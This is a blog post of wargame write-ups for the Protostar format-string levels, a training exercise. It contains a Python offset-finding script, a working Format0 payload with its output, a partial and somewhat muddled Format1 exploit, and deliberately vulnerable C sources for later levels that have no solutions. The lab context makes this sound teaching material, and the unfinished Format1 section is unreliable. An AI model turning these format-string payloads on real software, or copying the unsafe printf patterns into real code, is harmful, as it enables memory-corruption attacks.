---
layout: post
title: "Protostar | format exploit-exercises solutions"
date: 2015-02-21
comments: true
categories:
---

[Protostar](https://exploit-exercises.com/protostar/) introduces the following in a friendly way:

> * Network programming
* Byte order
* Handling sockets
* Stack overflows
* Format strings
* Heap overflows


A quick and dirty offset finder for argv[1], works kind of, will be used in later levels:

````python
import subprocess
from sys import argv
#Find parameter offset to argv[1]
#Inspired by https://lambdahackulus.wordpress.com

def system_call(command):
    p = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
    return p.stdout.read()
    
positions = []
for i in range(int(argv[2]) , int(argv[3])):
        f = "AAAAAAAA%"+str(i)+"\$8x"
	#print f
        ret = system_call(argv[1]+" " + f)
	#print ret
        if "414141" in ret:
		print f
                positions.append(i)
for pos in positions:
        print "Found at parameter: " + str(pos)

```

##Format0

This post assumes the reader know why a format string vulnerability occurs, if you don't know owasp have
a good intro [here](https://www.owasp.org/index.php/Format_string_attack).


Format0.c

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}

```

The given argument in vuln are saved into a buffer, without proper sprintf formatters.
We should be able to access and overwrite the target value with print specifiers.

The stack layout in vuln:

```
.text:0804844C buffer= byte ptr -4Ch
.text:0804844C target= dword ptr -0Ch
.text:0804844C string= dword ptr  8
```

And as string is below target we will be able to access and overwrite it with formatters.

Lets load it up in gdb and find the stack addresses for buffer and target to calculate the offset our format specifier will need to overwrite target relative from the buffer.

Relevant part of vuln function.

```nasm
mov    DWORD PTR [ebp-0xc],0x0 /*target = 0*/
mov    eax,DWORD PTR [ebp+0x8] /*format string*/
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x4c] /*buffer*/
mov    DWORD PTR [esp],eax
call   0x8048350 <sprintf@plt>
```

The addresses:

```
/*target*/
gdb-peda$ x/x $ebp-0xc
0xbffff35c: 0x00000000

/*buffer*/
gdb-peda$ x/x $ebp-0x4C
0xbffff31c: 0x00000001

```

Offset:```0xbffff35c-0xbffff31c = 0x40 = 64d```

And our payload becomes:

`64bytes+0xdeadbeef`

`%64x+0xdeadbeef`

`$(python -c 'print "%64x"+"\xef\xbe\xad\xde"')`


```
tomasuh@crunch:~/programming/pentest/protostar$ ./format0 $(python -c 'print "%64x"+"\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

Lets also verify it in gdb for fun.

![alt text](/images/format0.png "")

##Format1

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

```
   0x08048405 <+17>:	mov    eax,ds:0x8049638
   0x0804840a <+22>:	test   eax,eax
   0x0804840c <+24>:	je     0x804841a <vuln+38> //bad jump
```

We need to change `0x8049638`, first lets find the offset to our input buffer. (TODO)

```bash

```

Thats what we need to know, the exploit will look like this:
`|0x8049638|%8$n|`, which supposedly should give `0x8049638` the value 0x04000000

```

root@kali:~/Desktop/pentest/protostar# ./format1 %8\$p
0xbffff713 <-- base of argv[1]
0xbffff713-4-nrOfBytes = start
-4 for %8\$p

```

##Format2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}

```


##Format3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

##Format4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}

```
